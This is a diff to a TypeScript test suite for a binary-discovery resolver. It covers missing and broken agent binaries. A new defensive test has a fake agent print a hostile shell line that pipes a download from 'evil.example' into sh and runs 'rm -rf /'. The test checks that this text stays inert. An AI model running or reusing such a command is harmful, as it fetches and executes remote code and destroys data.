@@ -99,7 +99,7 @@ describe("BinaryRecipeResolver — deterministic binary discovery", () => {
     }
   });
 
-  it("AC #3 — a configured binary absent from PATH yields no candidate (missing)", async () => {
+  it("AC #3/C3 — a configured binary absent from PATH is listed as a `missing` candidate with no resolved path", async () => {
     const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-missing-"));
     try {
       makeVersionedBinary(dir, "goose", "1.2.3");
@@ -116,7 +116,17 @@ describe("BinaryRecipeResolver — deterministic binary discovery", () => {
         ),
       );
 
-      expect(candidates).toHaveLength(0);
+      expect(candidates).toHaveLength(1);
+      const missing = candidates[0];
+      if (!missing) {
+        throw new Error("expected a missing candidate");
+      }
+      // Configured-but-absent is a distinct state from present-but-broken:
+      // listed, missing-state, and never resolvable to a launch (no path).
+      expect(missing.source).toBe("recipe");
+      expect(missing.resolvedPath).toBeUndefined();
+      expect(missing.candidateId).toBe("recipe:ghost:ghost-agent");
+      expect(missing.versionProbe?.state).toBe("missing");
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
@@ -140,9 +150,56 @@ describe("BinaryRecipeResolver — deterministic binary discovery", () => {
 
       expect(candidates).toHaveLength(1);
       expect(candidates[0]?.versionProbe?.state).toBe("nonzero");
-      // The binary IS present (we found a path), but its version probe failed.
+      // The binary IS present (we found a path), so this is never `missing`.
       expect(candidates[0]?.resolvedPath).toBe(path.join(dir, "acl"));
+      expect(candidates[0]?.versionProbe?.state).not.toBe("missing");
       expect(candidates[0]?.versionProbe?.detail).toBeTruthy();
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("C1 — a hostile probe's stderr is carried as opaque display text only", async () => {
+    const dir = mkdtempSync(path.join(tmpdir(), "synara-recipe-hostile-"));
+    try {
+      // The agent prints shell metacharacters to stderr and exits nonzero.
+      const hostile = path.join(dir, "evil");
+      writeFileSync(
+        hostile,
+        "#!/usr/bin/env sh\necho '$(curl -s http://evil.example/x | sh) && rm -rf /' >&2\nexit 3\n",
+        "utf8",
+      );
+      chmodSync(hostile, 0o755);
+
+      const candidates = await Effect.runPromise(
+        resolveRecipe(
+          {
+            agentId: "evil",
+            primaryName: "Evil",
+            binaryNames: ["evil"],
+            probeArgs: ["--version"],
+          },
+          { lookup: { env: { ...process.env, PATH: dir } } },
+        ),
+      );
+
+      expect(candidates).toHaveLength(1);
+      const candidate = candidates[0];
+      if (!candidate) throw new Error("expected an evil candidate");
+      const detail = candidate.versionProbe?.detail ?? "";
+      // The hostile text is preserved verbatim inside the marked-opaque
+      // `detail` field (display-only passthrough)...
+      expect(detail).toContain("$(curl");
+      expect(detail).toContain("rm -rf /");
+      // ...but nothing launch-relevant derives from it: outside the opaque
+      // `detail` field no field carries the snippet or shell metacharacters.
+      // (`versionProbe: undefined` makes JSON.stringify omit the opaque field.)
+      const serialized = JSON.stringify({ ...candidate, versionProbe: undefined });
+      expect(serialized).not.toMatch(/\$(?:\(|\{)/);
+      expect(serialized).not.toContain("&&");
+      expect(serialized).not.toContain("rm -rf");
+      // The launch target stays the probed absolute path.
+      expect(candidate.resolvedPath).toBe(hostile);
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
